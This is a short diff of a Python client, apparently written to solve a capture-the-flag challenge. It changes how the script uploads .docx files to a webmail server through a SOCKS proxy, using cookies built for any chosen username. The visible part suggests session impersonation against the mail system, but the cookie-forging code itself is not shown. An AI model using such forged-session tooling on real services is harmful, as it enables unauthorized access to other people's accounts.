@@ -3,6 +3,7 @@ import binascii
 import requests
 import sys
 import json
+import os
 
 PROXY = "socks5h://localhost:32080"
 
@@ -35,14 +36,19 @@ class EWA:
         return resp.json()
 
     def upload(self, username, filename):
-        files = {'file': open(filename, 'rb')}
-
         cookies = self.make_cookies(username)
-        resp = self.ses.post(self.host + "/upload", cookies=cookies, files=files)
+        basename = os.path.basename(filename)
+
+        with open(filename, 'rb') as f:
+            # http://docs.python-requests.org/en/master/user/quickstart/#post-a-multipart-encoded-file
+            files = {'sampleFile': (basename, f, 'application/vnd.openxmlformats-officedocument.wordprocessingml.document')}
+            resp = self.ses.post(self.host + "/upload", cookies=cookies, files=files)
         body = resp.text
-        #body looks like like:
-        #<html><h1 style="text-align: center;">File Uploaded and link Attached!</h1><script>window.setTimeout(function() {window.location.href = '/upload.js'}, 2000);</script><script>localStorage.setItem("file_link", "http://mail.northpolechristmastown.com/attachments/DaM5HE08t7cynFqztM0a4VcVg8CBU2Gs7HprLQWzsdnSCRuj5L__cookies.docx");</script></html>
         #extract the link.  The link is the one string between quotes that contains http
+        #body looks like like:
+        #<html><h1 style="text-align: center;">File Uploaded and link Attached!</h1><script>window.setTimeout(function()
+        # {window.location.href = '/upload.js'}, 2000);</script><script>localStorage.setItem("file_link",
+        # "http://mail.northpolechristmastown.com/attachments/DaM5HE08t7cynFqztM0a4VcVg8CBU2Gs7HprLQWzsdnSCRuj5L__cookies.docx");</script></html>
         links = [frag for frag in body.split('"') if 'http' in frag]
         return links[0]
 
